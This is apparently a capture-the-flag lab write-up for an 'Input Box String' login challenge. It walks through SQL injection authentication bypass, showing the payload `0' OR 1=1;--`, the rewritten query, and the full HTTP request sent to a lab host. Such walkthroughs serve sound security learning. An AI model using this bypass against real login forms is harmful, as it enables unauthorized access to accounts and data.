# Challenge 2: Input Box String

![Pasted image 20210803160635](Pasted%20image%2020210803160635.png)

This challenge is comprised of a login form asking for a user ID and a password. Since the title of the challenge is "Input Box String," it appears the userID parameter is the target parameter and that is probably handled as a string in the backend SQL query.

The backend SQL query probably looks something like this:

```sql
SELECT profileID FROM profiles WHERE profileID = '$profileID' AND password = '$PASSWORD_HASH';
```

If it returns exactly one row, it grants the user an authentication cookie that allows them to access the application.

The injection of the `profileID` parameter looks like:

```txt
0' OR 1=1;--
```

Resulting in the following SQL query:

```sql
SELECT profileID FROM profiles WHERE profileID = '0' OR 1=1;-- ' AND password = 'd74ff0ee8da3b9806b18c877dbf29bbde50b5bd8e4dad7a3a725000feb82e8f1'; -- hash of 'pass'
```

The HTTP request:

```http
GET /sesqli2/login?profileID=0'+OR+1=1;--%20&password=pass HTTP/1.1
Host: 10.10.240.237:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.240.237:5000/sesqli2/login?profileID=0&password=pass%27+OR+1%3D1%3B+--
Cookie: session=.eJxFj8GKwzAMRP9F5xys2I6dnJeFXnrbc1AVGcy6SWo3LCX03-vQwt40b4Q0s8OV4kzrOt42yQ8YAqUiDRQptxRxnOhOMOzwc_qCARuQup5gAGhgpqvU6TvTzEssB4n8e37TqlYqZV3y_Zyr9p2yrbUKjfLmY_4teaqWYa-DU0xBE3JPbNi4qe2NFRWcD27Slhz3aMgLeuw0sbTaE15EOrwc1_ISYpIjI6CqoFCio01r1fO_zFYkj7H-xOcLcMxLdw.YQmjXA.qSZ6nBYhslfUn-2QFw573zIh39k
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

![Pasted image 20210803162801](Pasted%20image%2020210803162801.png)